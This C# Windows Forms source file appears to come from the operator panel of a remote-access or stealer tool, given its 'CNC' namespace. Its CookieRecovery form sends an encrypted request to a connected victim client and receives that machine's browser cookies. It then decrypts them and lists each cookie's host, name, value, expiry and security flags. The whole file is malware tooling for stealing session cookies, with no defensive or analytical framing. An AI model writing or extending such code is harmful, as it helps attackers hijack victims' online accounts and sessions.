using CNC.Core.Data;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BrowserTools;
using System.Windows.Forms;
using CNC.Core.Security;
using Newtonsoft.Json;

namespace CNC.Forms
{
    public partial class CookieRecovery : Form
    {
        Client currentClient;
        Cookie[] cookies;
        public CookieRecovery(Client client)
        {
            InitializeComponent();
            currentClient = client;
            Recover();
        }

        void Recover()
        {
            listView.Items.Clear();
            cookies = JsonConvert.DeserializeObject<Cookie[]>(
                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("RecoverCookieReq", "RecoverCookieRep", 20000, 
                Cryptography.Encrypt(Guid.NewGuid().ToString()))));

            for (int i = 0; i < cookies.Length; i++)
            {
                listView.Items.Add(new ListViewItem(new string[] 
                {
                    cookies[i].HostKey,
                    cookies[i].Name,
                    cookies[i].Value,
                    cookies[i].Path,
                    cookies[i].ExpiresUtc,
                    cookies[i].LastAccessUtc,
                    cookies[i].Secure.ToString(),
                    cookies[i].HttpOnly.ToString(),
                    cookies[i].Expired.ToString(),
                    cookies[i].Persistent.ToString(),
                    cookies[i].Priority.ToString(),
                    cookies[i].Browser.ToString()
                }));
            }
        }
    }
}
